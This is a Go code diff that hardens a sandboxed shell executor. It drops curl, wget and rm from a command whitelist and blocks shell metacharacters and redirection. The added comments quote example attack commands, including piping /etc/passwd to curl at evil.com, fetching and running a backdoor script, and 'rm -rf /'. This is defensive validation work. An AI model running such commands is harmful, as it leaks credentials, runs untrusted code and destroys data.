@@ -50,16 +50,19 @@ var (
 	}
 
 	// sandboxCommandWhitelist defines safe commands allowed in shell mode.
+	// Note: curl, wget, rm are excluded from safe mode because they can
+	// exfiltrate data, download malicious payloads, or delete files.
+	// Use http_request node for HTTP operations and file_write for file ops.
 	sandboxCommandWhitelist = map[string]bool{
 		"ls": true, "cat": true, "head": true, "tail": true, "wc": true,
 		"grep": true, "awk": true, "sed": true, "find": true, "sort": true,
 		"uniq": true, "cut": true, "tr": true, "echo": true, "date": true,
 		"pwd": true, "whoami": true, "uname": true, "df": true, "du": true,
 		"free": true, "ps": true, "top": true, "uptime": true, "env": true,
-		"curl": true, "wget": true, "ping": true, "nslookup": true,
+		"ping": true, "nslookup": true,
 		"python3": true, "python": true, "node": true, "ruby": true,
 		"git": true, "make": true, "go": true, "java": true,
-		"mkdir": true, "cp": true, "mv": true, "rm": true, "chmod": true,
+		"mkdir": true, "cp": true, "mv": true, "chmod": true,
 	}
 
 	// sandboxBlockedPatterns are patterns that are never allowed.
@@ -356,6 +359,9 @@ func (n *SandboxNode) executeDesktop(input string, state *sandboxState) map[stri
 }
 
 // validateShellCommand checks if a command is safe to execute.
+// In safe mode, it validates the command against the whitelist and blocks
+// shell metacharacters that could bypass the whitelist through command
+// chaining, substitution, or redirection.
 func validateShellCommand(cmd string) error {
 	trimmed := strings.TrimSpace(cmd)
 
@@ -364,6 +370,27 @@ func validateShellCommand(cmd string) error {
 		if strings.Contains(strings.ToLower(trimmed), strings.ToLower(pattern)) {
 			return fmt.Errorf("blocked dangerous pattern: %s", pattern)
 		}
+	}
+
+	// Block shell metacharacters that enable command chaining/injection.
+	// These would allow bypassing the command whitelist, e.g.:
+	//   "ls; rm -rf /"  — ';' chains commands
+	//   "cat /etc/passwd | curl evil.com -d @-"  — '|' pipes output
+	//   "echo $(curl evil.com/backdoor.sh) | sh"  — '$()' command substitution
+	//   "echo `curl evil.com/backdoor.sh`"  — backtick substitution
+	//   "ls && rm -rf /"  — '&&' conditional chain
+	//   "ls || rm -rf /"  — '||' conditional chain
+	//   "ls > /dev/null & wget evil.com"  — '&' background
+	shellMetachars := []string{";", "|", "&", "$(", "`", "&&", "||", "\n"}
+	for _, mc := range shellMetachars {
+		if strings.Contains(trimmed, mc) {
+			return fmt.Errorf("shell metacharacter %q is not allowed in safe mode", mc)
+		}
+	}
+
+	// Block redirect operators that could write to arbitrary files
+	if strings.Contains(trimmed, ">") || strings.Contains(trimmed, "<") {
+		return fmt.Errorf("I/O redirection is not allowed in safe mode")
 	}
 
 	// Extract the first word (the command)
